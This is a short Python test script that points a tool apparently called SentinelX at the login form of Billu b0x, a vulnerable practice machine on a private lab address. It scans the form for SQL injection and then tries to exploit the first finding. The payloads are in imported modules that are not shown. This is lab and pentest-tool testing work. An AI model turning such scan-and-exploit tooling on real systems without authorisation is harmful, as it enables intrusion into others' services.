"""
Standalone test: point SentinelX's SQLi scanner + exploiter directly
at Billu b0x's real login form (un/ps fields, POST to index.php,
no CSRF token) — bypassing full crawl/login since Billu's login
itself IS the injection point.
"""
import requests
from modules.sqli_scanner import SQLiScanner
from modules.sqli_exploiter import SQLiExploiter

BASE_URL = "http://192.168.98.132"
LOGIN_URL = f"{BASE_URL}/index.php"

session = requests.Session()

# Build the discovered_forms structure exactly like the crawler would,
# using the real fields we confirmed by hand
discovered_forms = {
    LOGIN_URL: [{
        "action": LOGIN_URL,
        "method": "post",
        "inputs": [
            {"name": "un", "type": "text", "value": ""},
            {"name": "ps", "type": "password", "value": ""},
            {"name": "login", "type": "submit", "value": "let's login"},
        ]
    }]
}

print("=" * 60)
print("  Testing Billu b0x login form for SQLi")
print("=" * 60)

scanner = SQLiScanner(session)
findings = scanner.scan_all(discovered_forms)

print()
print(f"Findings: {len(findings)}")
for f in findings:
    print(f"  {f['url']} param='{f['parameter']}' techniques={f.get('techniques_confirmed')}")

if findings:
    print()
    print("Attempting exploitation on first finding...")
    exploiter = SQLiExploiter(session)
    first = findings[0]
    base_params = {"un": "", "ps": "", "login": "let's login"}
    exploiter.exploit(first["url"], first["parameter"], base_params)
else:
    print()
    print("No SQLi findings from the scanner's payload set on this form.")
    print("This form may need manual testing with Billu-specific bypass syntax,")
    print("or the vulnerable parameter may be 'ps' specifically rather than 'un'")
    print("(the scanner tests both, but confirm manually if this comes back empty).")
